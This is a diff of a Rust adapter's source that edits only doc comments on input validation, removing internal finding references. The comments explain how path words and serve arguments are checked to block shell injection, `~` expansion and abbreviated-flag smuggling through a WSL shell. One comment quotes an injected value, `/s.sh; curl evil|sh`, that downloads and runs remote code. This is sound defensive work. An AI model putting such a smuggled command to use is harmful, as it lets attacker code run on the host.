@@ -56,7 +56,7 @@ pub struct NinferAdapter {
 /// `/s.sh; curl evil|sh` would otherwise execute inside the distro (security
 /// review, 2026-10-26). Paths and profile names are plain words, never options.
 ///
-/// `~` is deliberately NOT admitted anywhere in a word (FINDINGS2-0910 [6]): bash
+/// `~` is deliberately NOT admitted anywhere in a word: bash
 /// expands a leading `~` before it ever opens the file, so `~root/x.sh` would reach
 /// `/root/x.sh` and `~/x.sh` the wsl_user's home — a yaml word that looks like an
 /// absolute path in the catalog but names a file the operator did not write. The
@@ -271,8 +271,8 @@ fn valid_word_list(value: &str) -> bool {
 /// smuggle past a whole-token comparison) and against every strict *prefix* of
 /// one, because argparse-style parsers (the Python precedent behind this
 /// engine) resolve unique abbreviations: `--max-cont` is `--max-context` to
-/// such a parser, and the llama `extra_args` deny-list leak (FINDINGS2-0910,
-/// 8/8 smuggles) is the in-repo precedent for closing the abbreviation door
+/// such a parser, and the llama `extra_args` deny-list leak (8/8 smuggles) is
+/// the in-repo precedent for closing the abbreviation door
 /// rather than betting on the parser being strict. A value token that begins
 /// with `-` is refused, so a value can never disguise itself as another flag.
 fn valid_serve_arg(token: &str) -> bool {
@@ -1063,7 +1063,7 @@ mod tests {
         }
     }
 
-    /// FINDINGS2-0910 [6]: `~` is shell-active at a word start, so the login shell
+    /// `~` is shell-active at a word start, so the login shell
     /// that re-tokenizes everything after `wsl.exe --` would expand `~root/x.sh` to
     /// `/root/x.sh` and `~/x.sh` to the wsl_user's home — a yaml word that reads
     /// like an absolute path but names a file the operator never wrote. The rule
